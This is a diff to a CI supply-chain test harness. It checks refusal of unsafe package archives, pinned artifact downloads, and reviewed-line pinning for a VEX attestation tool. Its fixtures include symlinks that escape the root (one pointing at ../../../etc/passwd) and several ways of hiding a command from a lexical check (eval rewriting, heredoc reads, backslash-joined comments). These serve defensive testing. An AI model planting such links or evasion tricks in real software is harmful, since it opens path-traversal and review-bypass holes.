+                   ("a relative link that leaves the root next to an absolute link (etc/mtab -> /proc/mounts ; usr/lib/x -> ../../../etc/passwd)", [("etc/mtab", "sym", "/proc/mounts", None), ("usr/lib/x", "sym", "../../../etc/passwd", None)])):
+    case("AC17 a data segment with %s is refused (exit 1), nothing written" % label,
+         setup=(lambda e: lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + e))(ent), want=1)
+case("AC17 a member of a LATER package placed below the path of a skipped absolute link is refused (the path is held by the package that named it)", setup=lambda d: (apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("etc/mtab", "sym", "/proc/mounts", None)]), apk(d + "/archive/" + ARCH + "/libpsx-2.78-r4.apk", "libpsx", "2.78-r4", [("etc/mtab/x", "file", b"E", None)])), lock=LOCK + "libpsx=2.78-r4\n", want=1)
+
+def two_pk(first, second, second_first=False):
+    def setup(d):
+        apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + first)
+        apk(d + "/archive/" + ARCH + "/libpsx-2.78-r4.apk", "libpsx", "2.78-r4", second)
+    return setup
+
+
+SKIP = [("etc/mtab", "sym", "/proc/mounts", None)]
+for label, first, second, rev in (
+        ("a directory entry at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "dir", None, None)], False),
+        ("a directory entry at the path of a skipped absolute link in the same package", SKIP + [("etc/mtab", "dir", None, None)], [("usr/lib/other", "file", b"x", None)], False),
+        ("a file at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "file", b"E", None)], False),
+        ("a relative link at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "sym", "../x", None)], False),
+        ("a second absolute link at the path of a skipped absolute link in a LATER package", SKIP, [("etc/mtab", "sym", "/proc/self/mounts", None)], False),
+        ("a symlink at an ANCESTOR of a skipped absolute link in a LATER package (opt/bin -> /external ; opt -> payload)", [("opt/bin", "sym", "/external", None)], [("opt", "sym", "payload", None), ("payload/bin/bwrap", "file", b"E", None)], False),
+        ("a symlink at an ancestor of a skipped absolute link in the same package, after it", [("opt/bin", "sym", "/external", None), ("opt", "sym", "payload", None)], [("usr/lib/other", "file", b"x", None)], False),
+        ("a symlink at an ancestor named by an EARLIER package, the skipped link below it (opt -> payload ; opt/bin -> /external)", [("opt/bin", "sym", "/external", None)], [("opt", "sym", "payload", None)], True)):
+    case("AC17 %s is refused (exit 1), nothing written" % label, setup=two_pk(first, second), lock=(("libpsx=2.78-r4\n" + LOCK) if rev else (LOCK + "libpsx=2.78-r4\n")), want=1)
+case("AC17 no loader in the unpacked tree is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/ld-linux-2.43-r13.apk", "ld-linux", "2.43-r13", [("usr/lib/other", "file", b"x", None)]), want=1)
+case("AC17 two loaders in the unpacked tree are refused (the wrapper must name exactly one)", setup=lambda d: apk(d + "/archive/" + ARCH + "/ld-linux-2.43-r13.apk", "ld-linux", "2.43-r13", [("usr/lib/ld-linux-x86-64.so.2", "file", LOADER, 0o755), ("lib/ld-linux-x86-64.so.2", "file", LOADER, 0o755)]), want=1)
+case("AC17 no usr/bin/bwrap in the unpacked tree is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/bubblewrap-0.13.0-r0.apk", "bubblewrap", "0.13.0-r0", [("usr/bin/other", "file", b"x", 0o755)]), want=1)
+case("AC17 a host-tools directory that already exists is refused (exit 2), nothing in it touched", setup=lambda d: (os.makedirs(d + "/host-tools"), open(d + "/host-tools/keep", "w").write("k")), want=2, nothing_written=False,
+     after=lambda d, r: (open(d + "/host-tools/keep").read() == "k" and not os.path.exists(d + "/bin/bwrap")) or (_ for _ in ()).throw(AssertionError("touched")))
+for label, lk in (("an empty lock", ""), ("a lock row with no version", "bubblewrap\n"), ("a lock with a blank row", LOCK + "\n"), ("a lock with a carriage return", LOCK.replace("\n", "\r\n")),
+                  ("a lock without its final line end", LOCK.rstrip("\n")), ("a lock that names a package twice", LOCK + "libcap=2.78-r4\n"), ("a lock row with a path part", "../x=1.0-r0\n" + LOCK),
+                  ("a lock row with a space", "bubblewrap = 0.13.0-r0\n"), ("a lock row that is a comment", "# bubblewrap\n" + LOCK)):
+    case("AC17 %s is refused (exit 2), nothing written" % label, lock=lk, want=2)
+case("AC17 an architecture other than x86_64 and aarch64 is refused (exit 2)", arch="riscv64", want=2)
+case("AC17 aarch64 is accepted and reads archive/aarch64/", arch="aarch64", setup=lambda d: (shutil.copytree(d + "/archive/" + ARCH, d + "/archive/aarch64"), [apk(d + "/archive/aarch64/" + f, f.rsplit("-", 2)[0], "-".join(f[:-4].rsplit("-", 2)[1:]), [("usr/bin/bwrap", "file", b"B", 0o755)] if f.startswith("bubblewrap") else [("usr/lib/ld-linux-aarch64.so.1", "file", LOADER, 0o755)] if f.startswith("ld-linux") else [("usr/lib/x%s" % f, "file", b"x", None)], arch="aarch64") for f in os.listdir(d + "/archive/aarch64")]), after=lambda d, r: os.path.exists(d + "/host-tools/usr/lib/ld-linux-aarch64.so.1") or (_ for _ in ()).throw(AssertionError("aarch64 loader")))
+case("AC17 a wrapper that cannot be published (bin/bwrap is a directory) is refused (exit 1) and leaves neither the host-tools directory, a staging directory nor a temporary wrapper", setup=lambda d: os.makedirs(d + "/bin/bwrap"), want=1, nothing_written=False,
+     after=lambda d, r: (not os.path.exists(d + "/host-tools") and not os.path.exists(d + "/host-tools.staging") and not [f for f in os.listdir(d + "/bin") if f.startswith(".bwrap.")]) or (_ for _ in ()).throw(AssertionError("residue")))
+case("AC17 an unknown option is refused (exit 2)", extra_args=("--sudo",), want=2)
+text = open(script).read()
+for word in sys.argv[3].split("|"):
+    print(("ok   " if word not in text else "FAIL ") + "AC17 the host-tools script never names %r (no network, no package manager, no sudo, no other program)" % word)
+PY
+while IFS= read -r line; do case $line in "ok   "*) ok "${line#ok   }";; *) bad "${line#FAIL }";; esac; done < "$work/ac17.out"
 # REQ-CHAIN-004-AC16: the two files the stage's pull step runs are rows of the committed list with their committed sha256
 python3 - "$root/.github/policy/chain-scripts.json" "$work/ar-nosha.json" "$work/ar-norow.json" <<'PY'
 import json, sys
@@ -1072,6 +1313,8 @@ fi
 # ---- bin/witnessed.sh RUN against a fake witness, curl and timeout (REQ-CHAIN-004-AC2): the command is bounded and a failure leaves no record ------
 # The fake timeout enforces FAKE_TIMEOUT_SECONDS (a short test limit) and logs the limit it was given: the helper must give 540. The fake witness runs the
 # command after `--` and writes its -o record only when the command succeeded, as the real Witness does.
+# the name of the fake download program the helper trees put on PATH
+FAKE_FETCH_TOOL=curl
 helper_tree() { # helper_tree DIR HELPER
   rm -rf "$1"; mkdir -p "$1/bin" "$1/fake" "$1/tmp"; cp "$2" "$1/bin/witnessed.sh"; cp bin/loopback-get.sh "$1/bin/loopback-get.sh"
   cat > "$1/bin/wrapped.sh" <<'EOF'
@@ -1099,10 +1342,10 @@ ls "$RUNNER_TEMP"/tok* > tokfiles-at-start.txt 2> /dev/null || true
 "${args[@]:$((i + 1))}" || exit $?
 mkdir -p "$(dirname "$record")"; echo '{"record":true}' > "$record"
 EOF
-  cat > "$1/fake/curl" <<'EOF'
+  cat > "$1/fake/$FAKE_FETCH_TOOL" <<'EOF'
 #!/usr/bin/env bash
-echo curl >> calls.log
-n=$(grep -c '^curl$' calls.log)
+echo fetch >> calls.log
+n=$(grep -c '^fetch$' calls.log)
 [ "${CURL_FAIL_AT:-0}" != "$n" ] || exit 22
 [ "${CURL_EMPTY_AT:-0}" != "$n" ] || { printf '{"value":""}\n'; exit 0; }
 [ "${CURL_NULL_AT:-0}" != "$n" ] || { printf '{"value":null}\n'; exit 0; }
@@ -1793,10 +2036,19 @@ import re, sys, yaml
 text = open(sys.argv[1]).read()
 d = yaml.load(text, Loader=yaml.BaseLoader)
 bad = []
+own = {(s.get("with") or {}).get("name") for jn, j in (d.get("jobs") or {}).items() for s in (j.get("steps") or []) if jn == "vex-attach" and str(s.get("uses", "")).startswith("actions/upload-artifact@")} & {"vex-attach"}      # what the rescan's own vex-attach job uploads (the digests of its scratch attestations), nothing else
 for jn, j in (d.get("jobs") or {}).items():
     for s in (j.get("steps") or []):
-        if str(s.get("uses", "")).startswith("actions/download-artifact@") and "pattern" not in (s.get("with") or {}) and (s.get("with") or {}).get("name") not in ("images", "dist", "digests", "items"):
-            bad.append("%s downloads %r, which Build never uploads" % (jn, (s.get("with") or {}).get("name")))
+        w_ = s.get("with") or {}
+        # the daily rescan's panel job downloads each scanner job's artifact by ARTIFACT ID (cache#602: one artifact can never stand for another); bin/panel-wiring-test.sh judges those four in full
+        if str(s.get("uses", "")).startswith("actions/download-artifact@") and "artifact-ids" in w_:
+            if jn != "panel" or not re.fullmatch(r"\$\{\{ needs\.panel-(grype|scout|inspector|google)\.outputs\.artifact-id \}\}", w_.get("artifact-ids", "")) or set(w_) != {"artifact-ids", "path"}:
+                bad.append("%s downloads by artifact id %r, which only the panel job may do, and only a scanner job's own artifact" % (jn, w_.get("artifact-ids")))
+            continue
+        if str(s.get("uses", "")).startswith("actions/download-artifact@") and "pattern" not in (s.get("with") or {}) and (s.get("with") or {}).get("name") not in ("images", "dist", "digests", "items") + tuple(own):
+            bad.append("%s downloads %r, which neither Build nor this workflow's own vex-attach job uploads" % (jn, (s.get("with") or {}).get("name")))
+        if str(s.get("uses", "")).startswith("actions/download-artifact@") and (s.get("with") or {}).get("name") in own and jn != "panel-scout":
+            bad.append("%s downloads %r, which only panel-scout may download" % (jn, (s.get("with") or {}).get("name")))
 for gone in ("oci-candidate", "dist-snapshot", "outputs.checksums"):
     if gone in text: bad.append("still names %s" % gone)
 if re.search(r"\bdebug\b", re.sub(r"(?m)^\s*#.*$", "", text)): bad.append("still names the debug variant")
@@ -1811,11 +2063,17 @@ f1() { # f1 ok|caught LABEL FILE [sed-expr]
   if { [ "$1" = ok ] && [ "$rc" = 0 ]; } || { [ "$1" = caught ] && [ "$rc" != 0 ]; }; then ok "AC14/F1 $2${out:+ ($out)}"; else bad "AC14/F1 $2 -> $out"; fi; }
 for w in scan main-candidate-rescan; do f1 ok "the real $w.yml consumes only Build's artifacts, no debug, no .oci, no checksums output" "$root/.github/workflows/$w.yml"; done
 f1 caught "an old artifact name oci-candidate is caught" "$root/.github/workflows/scan.yml" 's/name: images/name: oci-candidate/'
+f1 caught "the vex-attach artifact downloaded by a job other than panel-scout (here vex-attach itself) is caught" "$root/.github/workflows/main-candidate-rescan.yml" '1,/name: images/s/name: images/name: vex-attach/'
+f1 caught "a download of vex-attach in a workflow whose own vex-attach job does not upload it (scan.yml) is caught" "$root/.github/workflows/scan.yml" 's/name: images/name: vex-attach/'
 f1 caught "an old artifact name dist-snapshot is caught" "$root/.github/workflows/scan.yml" 's/name: dist$/name: dist-snapshot/'
 f1 caught "needs.build.outputs.checksums is caught" "$root/.github/workflows/scan.yml" 's/needs.build.outputs.digests }}$/needs.build.outputs.checksums }}/'
 f1 caught "the debug variant in a scan loop is caught" "$root/.github/workflows/scan.yml" 's/for v in production fips/for v in production debug fips/'
 f1 caught "a <variant>.tar archive path is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#oci:/tmp/oci/${v}#oci-archive:/tmp/oci/${v}.tar#'
 f1 caught "a download of an artifact Build never uploads is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: oci-images/'
+f1 caught "a panel download by artifact id of something that is not a scanner job's own artifact is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/artifact-ids: ${{ needs.panel-grype.outputs.artifact-id }}/artifact-ids: ${{ needs.vex-attach.outputs.artifact-id }}/'
+f1 caught "a download by artifact id outside the panel job is caught" "$root/.github/workflows/main-candidate-rescan.yml" '1,/name: images/s/name: images/artifact-ids: ${{ needs.panel-grype.outputs.artifact-id }}/'
+f1 caught "a panel download by artifact id with a name beside it is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#path: /tmp/panel/panel-scout#name: images#'
+f1 caught "a panel download by artifact id with another key (run-id) in place of the path is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#path: /tmp/panel/panel-scout#run-id: 123#'
 # Codex A r2 blocker 1 / B4: the release-candidate tag (vX.Y.Z-rcN, advisor 0383) runs the REAL `policy make` of bin/chain-verify.py in both assemble scripts (the
 # harness no longer fakes it for an rc tag): the stage completes and the policy carries the FULL tag; a near-miss tag stops at the policy, before any build
 for kind in assemble rebuild-assemble; do
@@ -2306,13 +2564,17 @@ expect ok "AC3 the five real scripts are rows of .github/policy/chain-scripts.js
 # other mention in them, every other file in the whole tree (the prose directories docs/, requirements/ and test-evidence/ at its top excepted) and every link to the tool is
 # refused; a comment is no exemption (a #-led line can be live code to bash).
 cat > "$work/vi-named.py" <<'PY'
-import glob, hashlib, os, re
+import glob, hashlib, os, re, yaml
 BASE = {"bin/build-stage-assemble.sh", "bin/build-stage-rebuild-assemble.sh", "bin/build-stage-snapshot-assemble.sh", "bin/build-stage-snapshot-rebuild-assemble.sh",
         "bin/vex-index.py", "bin/vex-index-test.sh", "bin/chain-build-wiring-test.sh", "bin/chain-test-harness.py", "bin/chain-test-shape.py", ".github/policy/chain-scripts.json",
         "bin/check-file-allowlist.sh", ".github/workflows/ci.yml"}      # the allowlist only names the file (it admits it as a repository file; it runs nothing); ci.yml runs its test, checked below
 RUN, TEST = "bin/vex-live-run.sh", "bin/vex-live-test-test.sh"
-PINWIRE = (".github", "tests", "pin-wiring-test.sh")      # the pin-wiring judge is recognised by the SHAPE of its path, .github/<one directory>/tests/pin-wiring-test.sh, so this file never names the auditor directory (REQ-AUD-18 AC1: nothing outside it refers to it); the judge quotes ci.yml's step "bash bin/vex-index-test.sh </dev/null" (the test script, never the tool); in that ONE file every line that names vex-index must be, after strip(), one of the reviewed lines in PIN_LINES (sha256): the lines of main's judge (cache#489/#521) and of the strict judge (cache#508). Erasing a quoted string was refused in review (adjacent literals or an eval-rewritten command ran it); a new or changed line is refused until a reviewed change updates the list. KNOWN LIMITS (round 3, both seats; stated, not hidden): a reviewed line can still be consumed by LATER lines of the same file that do not name vex-index (for example os.system on the dictionary's run value), which the two live-test files' alias checks do not allow for themselves, and the whole naming check is lexical (a spelling that never puts vex-index on one line is not seen, in every file, as before this change); the judge file is itself a reviewed, pinned security file, so a change to it is a reviewed change
+PINWIRE = (".github", "tests", "pin-wiring-test.sh")      # the pin-wiring judge is recognised by the SHAPE of its path, .github/<one directory>/tests/pin-wiring-test.sh, so this file never names the auditor directory (REQ-AUD-18 AC1: nothing outside it refers to it); the judge quotes ci.yml's step "bash bin/vex-index-test.sh </dev/null" (the test script, never the tool); in that ONE file every line that names vex-index must be, after strip(), one of the reviewed lines in PIN_LINES (sha256): the lines of main's judge (cache#489/#521/#540) and of the strict judge (cache#508). Erasing a quoted string was refused in review (adjacent literals or an eval-rewritten command ran it); a new or changed line is refused until a reviewed change updates the list. KNOWN LIMITS (round 3, both seats; stated, not hidden): a reviewed line can still be consumed by LATER lines of the same file that do not name vex-index (for example os.system on the dictionary's run value), which the two live-test files' alias checks do not allow for themselves, and the whole naming check is lexical (a spelling that never puts vex-index on one line is not seen, in every file, as before this change); the judge file is itself a reviewed, pinned security file, so a change to it is a reviewed change
 PIN_LINES = frozenset((
+    "da7e0d333bef74e866268a6724b75adb51173fc2428c94d79f687e941c5ecc60",
+    "dfc8b28ba0489c3e91555f19b62d1c2bc0a8623a3896a35711a66f467a35720a",
+    "3237e803c9ef9113386f75a589beb5ff29439494fc950e36c74a681cdf9f5dc0",
+    "4953659b48a4026c7420810bf06d5dd7f979f506ec2e0230e846e8db6108f375",
     "76dd2d9e0ddeb935a8e2715fe26fe325cbb168b0c63656a16a0e0f9588029091",
     "b7827728ad4015e730527cbbad9ff10f27f0e01b578d263b4aafac79b2638630",
     "ed9b7baf50c1a06493904a32858062357734918badcf226bc41eb6ecf4033be8",
@@ -2320,6 +2582,18 @@ PIN_LINES = frozenset((
     "7461149042047fd8d64d6d06d7f4f374f16b54a7151a0ea456525e0d80176cb8",
     "9ca61104b6e4518e5faca29e6733bfc150f90f2cdf5708258d192c44ee244f4f",
 ))
+RESCAN = ".github/workflows/main-candidate-rescan.yml"      # the daily rescan (cache#489, handoff 0521) attaches our OpenVEX to its own SCRATCH copies of the candidates (never a published version; its vex-attach job pushes only candidate and fixture tags to the scratch package, judged by bin/panel-wiring-test.sh): in that one file a line naming vex-index must be, after strip(), one of these reviewed lines (sha256), the call lines of that job and the comment above them
+RESCAN_LINES = frozenset((
+    "238f1cc11ed234ed6ed4396dac82934ef001e1193bd8891934c557fbf21b9ba4",
+    "2766fae27cbf871666460813d629a451a4b861a63f18bd64a55ca2d9e6c53bdf",
+))
+PANEL = "bin/panel-wiring-test.sh"      # the test that judges the rescan's vex-attach job quotes its calls as needles and mutation fixtures (data, never run as the tool): reviewed lines only, by sha256, in that one file
+PANEL_LINES = frozenset((
+    "0c58c87305a5593dd87bbbe04da7ef0dd1621782ed4cade1063828f7a875fd55",
+    "acf37cefa743a26b69d9172508b2ce2852040cff3570050effb1ad7cfaefbc8f",
+    "02370c2e7ed26850785448f26236801560e51c8a79aab599cacf3e2af66f9b57",
+))
+LINE_PINS = {RESCAN: RESCAN_LINES, PANEL: PANEL_LINES}
 RUN_CALL = 'python3 "$GITHUB_WORKSPACE/bin/vex-index.py" layout --layout scout-fixture --vex scout-fixture.vex.json >/dev/null || return 1'
 VI_RESULT_LINES = ('check("wrap-index: the real attestation tool accepts the wrapped layout and makes the final index from it", vi_run.returncode == 0, vi_run.stderr[-300:])',
                    'check("scout-vex: the attached document passes the attestation tool\'s own OpenVEX check (the tool is run, never loaded into this process)", vi_run.returncode == 0, vi_run.stderr[-300:])')
@@ -2345,6 +2619,20 @@ def stray(root):
             rel = os.path.relpath(path, root).split(os.sep)
             if len(rel) == 4 and (rel[0], rel[2], rel[3]) == PINWIRE:
                 if any("vex-index" in ln and hashlib.sha256(ln.strip().encode()).hexdigest() not in PIN_LINES for ln in text.splitlines()):
+                    named.add(os.path.relpath(path, root))
+                continue
+            pins = LINE_PINS.get(os.path.relpath(path, root))
+            if pins is not None:
+                nl = [ln.strip() for ln in text.splitlines() if "vex-index" in ln]
+                ok = all(hashlib.sha256(ln.encode()).hexdigest() in pins for ln in nl)
+                if ok and os.path.relpath(path, root) == RESCAN:      # cache#561 ruling: every admitted line exactly once, and the calls only inside jobs.vex-attach
+                    try:
+                        va = ((yaml.safe_load(text) or {}).get("jobs") or {}).get("vex-attach") or {}
+                        inside = {l.strip() for st in (va.get("steps") or []) for l in (st.get("run") or "").splitlines()}
+                    except (yaml.YAMLError, AttributeError):
+                        inside = None
+                    ok = inside is not None and len(nl) == len(set(nl)) and all(ln.startswith("#") or ln in inside for ln in nl)
+                if not ok:
                     named.add(os.path.relpath(path, root))
                 continue
             if "vex-index" in text:
@@ -2426,8 +2714,8 @@ vim h2 "REQ-REL-010-AC4 a # inside a quoted string hiding a vex-index call is re
 vim h3 "REQ-REL-010-AC4 a \${var#...} expansion hiding a vex-index call is refused" bin/vex-live-run.sh '' $'\nr=${CANDIDATE_DIR#/}; python3 bin/vex-index.py layout --layout "/$r/images/production" --vex v.json\n'
 vim h5 "REQ-REL-010-AC4 another use of the loaded vex-index module in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nVI.main(["layout", "--layout", os.environ.get("CANDIDATE_DIR", "x"), "--vex", "v.json"])\n'
 vim j2 "REQ-REL-010-AC4 a #-led line that bash joins to the previous line (backslash) and runs is refused" bin/vex-live-run.sh '' $'\necho a\\\n#; python3 bin/vex-index.py layout --layout "$CANDIDATE_DIR/images/production" --vex v.json\n'
-vim j4 "REQ-REL-010-AC4 a #-led heredoc body line that read splits and runs is refused" bin/vex-live-run.sh '' $'\nwhile read -r _ c; do $c; done <<\'EOT\'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\nEOT\n'
-vim j5 "REQ-REL-010-AC4 a #-led line inside a multi-line quoted string that is later run is refused" bin/vex-live-run.sh '' $'\nx=\'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\'\nread -r _ c <<<"${x#?}"; $c\n'
+vim j4 "REQ-REL-010-AC4 a #-led heredoc body line that read splits and runs is refused" bin/vex-live-run.sh '' $'\nwhile read -r _ c; do $c; done <<'"'"$'EOT'"'"$'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json\nEOT\n'
+vim j5 "REQ-REL-010-AC4 a #-led line inside a multi-line quoted string that is later run is refused" bin/vex-live-run.sh '' $'\nx='"'"$'\n# python3 bin/vex-index.py layout --layout /cand/images/production --vex v.json'"'"$'\nread -r _ c <<<"${x#?}"; $c\n'
 vim j6 "REQ-REL-010-AC4 reaching the loaded module through VI.check_vex.__globals__ in the live-test test file is refused" bin/vex-live-test-test.sh '' $'\nVI.check_vex.__globals__["main"](["layout"])\n'
 vim k1 "REQ-REL-010-AC4 a file with another extension or none, in another directory, naming the tool is refused (bin/lib/x.sh)" bin/lib/x.sh '' $'python3 bin/vex-index.py layout --layout x\n'
 vim k2 "REQ-REL-010-AC4 a workflow with the .yaml extension naming the tool is refused" .github/workflows/x.yaml '' $'run: python3 bin/vex-index.py layout --layout x\n'
@@ -2459,6 +2747,23 @@ vim p8 "REQ-REL-010-AC4 adjacent string literals around the quoted step string h
 vim p9 "REQ-REL-010-AC4 the step string put in a variable that later lines rewrite to the tool and eval is refused (round 2, seat B)" $PW '' $'cmd="bash bin/vex-index-test.sh </dev/null"\ncmd=${cmd/#bash/python3}\ncmd=${cmd/-test.sh/.py}\neval "$cmd layout --layout /fixture"\n'
 vim p10 "REQ-REL-010-AC4 a reviewed line with anything appended (a comment, a call) is refused" $PW '' "${L1%$'\n'}  # x"$'\n'
 vim p11 "REQ-REL-010-AC4 a reviewed line with a call appended after it on the same line is refused" $PW '' "${L1%$'\n'}; os.system(x)"$'\n'
+# the daily rescan (main-candidate-rescan.yml, cache#489, handoff 0521) attaches our OpenVEX to its own scratch copies of the candidates (never a published version): in THAT file, and only there, a line naming
+# vex-index is admitted only if it is one of the reviewed lines (RESCAN_LINES, by sha256 of the stripped line)
+RS=.github/workflows/main-candidate-rescan.yml
+RSHEAD=$'jobs:\n  vex-attach:\n    steps:\n      - run: |\n'
+R2=$'          python3 bin/vex-index.py layout --layout /tmp/layout/fixture-ours --vex /tmp/attach/selfcheck-ours.json\n'
+R1=$'          python3 bin/vex-index.py verify-layout --layout /tmp/layout/fixture-ours --vex /tmp/attach/selfcheck-ours.json --base-digest "${before}"\n'
+vimok r1 "REQ-REL-010-AC4 the daily rescan's reviewed vex-index lines (the fixture calls on a scratch layout), once each inside jobs.vex-attach, are admitted in main-candidate-rescan.yml only" $RS "$RSHEAD$R1$R2"
+vim r2 "REQ-REL-010-AC5 the daily rescan naming vex-index in a line that is not a reviewed line (an attach to a published reference) is refused" $RS '' "$RSHEAD$R2"$'          python3 bin/vex-index.py attach ghcr.io/fosterstack/cache@sha256:0000000000000000000000000000000000000000000000000000000000000000\n'
+vim r3 "REQ-REL-010-AC4 a reviewed rescan line with the layout changed to Build's images is refused" $RS '' "$RSHEAD"$'          python3 bin/vex-index.py layout --layout /tmp/oci/production --vex /tmp/attach/selfcheck-ours.json\n'
+vim r4 "REQ-REL-010-AC4 a reviewed rescan line in another workflow file is refused" .github/workflows/other.yml '' "$RSHEAD$R2"
+vim r8 "REQ-REL-010-AC5 a reviewed rescan line twice (once more than reviewed) is refused (cache#561 ruling: each admitted line exactly once)" $RS '' "$RSHEAD$R2$R2"
+vim r9 "REQ-REL-010-AC5 a reviewed rescan line inside a job other than vex-attach is refused (R2 probe: the line steered at a published copy in scout-root-cause)" $RS '' "$RSHEAD$R2"$'  scout-root-cause:\n    steps:\n      - run: |\n'"$R1"
+PT=bin/panel-wiring-test.sh
+R3=$(printf '%s\n' '        if "vex-index" in att[0].get("run", ""):'); R3="$R3"$'\n'
+vimok r5 "REQ-REL-010-AC4 the panel wiring test's reviewed lines that name the tool (its checks and one mutation fixture) are admitted in bin/panel-wiring-test.sh only" $PT "$R3"
+vim r6 "REQ-REL-010-AC5 bin/panel-wiring-test.sh naming vex-index in a line that is not a reviewed line is refused" $PT '' "$R3"$'subprocess.run(["python3", "bin/vex-index.py", "attach", "ghcr.io/fosterstack/cache"])\n'
+vim r7 "REQ-REL-010-AC4 the panel wiring test's reviewed needle line in another test file is refused" bin/other-wiring-test.sh '' "$R3"
 # a link to the tool is the tool: refused wherever it sits
 ld="$work/vim-link"; rm -rf "$ld"; mkdir -p "$ld/bin" "$ld/.github/workflows" "$ld/.github/policy"; cp "$root/bin/vex-live-run.sh" "$root/bin/vex-live-test-test.sh" "$ld/bin/"
 printf 'x\n' > "$ld/bin/vex-index.py"; ln -s vex-index.py "$ld/bin/attach.py"
@@ -2510,7 +2815,23 @@ for action in ("download-artifact", "upload-artifact"):
     assert len(found) == 1, "stage files pin %d different %s digests: %s" % (len(found), action, sorted(found))
     assert "actions/" + action + "@" + next(iter(found)) in allowed, "the pinned %s digest is not on the allowlist" % action
 PY
-EXPECT=860
+# AC17 (the absolute symlink ruling): the unpacked host-tools root is only ever USED by the wrapper (the extracted loader run with --library-path); no script or stage file
+# chroots into it, bind-mounts it, pivots into it or hands it to bwrap/unshare as a root, so an absolute link inside it (etc/mtab -> /proc/mounts) is never resolved against the host
+python3 - "$root" <<'PY' && ok "AC17 nothing chroots into, bind-mounts or pivots into the host-tools root (and an absolute link is never created in it)" || bad "AC17 something chroots into, bind-mounts or pivots into the host-tools root"
+import glob, re, sys
+root = sys.argv[1]
+files = sorted(glob.glob(root + "/.github/workflows/stage-*.yml") + glob.glob(root + "/bin/build-stage-*.sh") + [root + "/bin/install-host-bwrap.py"])
+assert len(files) >= 6, "too few files scanned: %s" % files
+used = 0
+for f in files:
+    for i, line in enumerate(open(f).read().splitlines(), 1):
+        if "host-tools" in line and not line.lstrip().startswith("#"):
+            used += 1
+            bad = re.search(r"chroot|pivot_root|nsenter|--bind|--ro-bind|--dev-bind|--overlay|\bmount\b|--root-bind|unshare", line)
+            assert not bad, "%s:%d uses the host-tools root as a root or mount (%s)" % (f, i, bad.group(0))
+assert used >= 3, "the scan found no use of the host-tools root"
+PY
+EXPECT=966
 echo "pass=$pass fail=$failn"
 if [ "$EXPECT" != 0 ] && [ $((pass + failn)) != "$EXPECT" ]; then
   echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1
